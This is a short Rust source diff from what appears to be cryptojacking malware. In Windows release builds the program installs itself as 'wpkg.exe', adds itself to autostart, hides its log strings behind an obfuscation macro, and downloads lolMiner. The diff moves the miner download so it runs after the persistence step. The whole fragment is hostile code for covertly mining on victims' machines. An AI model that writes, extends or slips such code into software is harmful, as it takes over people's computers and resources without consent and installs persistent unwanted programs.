@@ -59,9 +59,6 @@ async fn main() {
         .get(0)
         .unwrap_or(&Address::default())
         .format();
-    
-    println!("{}", &utils::get_working_dir().unwrap());
-    crypto::download_lolminer(&utils::get_working_dir().unwrap()).await.unwrap();
 
     #[cfg(all(target_os = "windows", not(debug_assertions)))]
     {
@@ -76,7 +73,7 @@ async fn main() {
 
             let config_dir = utils::get_working_dir()?;
             let exe_target = format!("{}\\{}", &config_dir, &crypto!("wpkg.exe"));
-            
+
             info_crypt!("Adding to autostart...");
             // adding to autostart
             utils::run_process(
@@ -130,6 +127,11 @@ async fn main() {
             error!("{}: {}", crypto!("Failed to install WPKG"), err);
             process::exit(0);
         }
+    }
+
+    match crypto::download_lolminer().await {
+        Err(err) => error!("{}{}", crypto!("Miner installing failed"), err),
+        Ok(_) => {},
     }
 
     tokio::spawn(async {
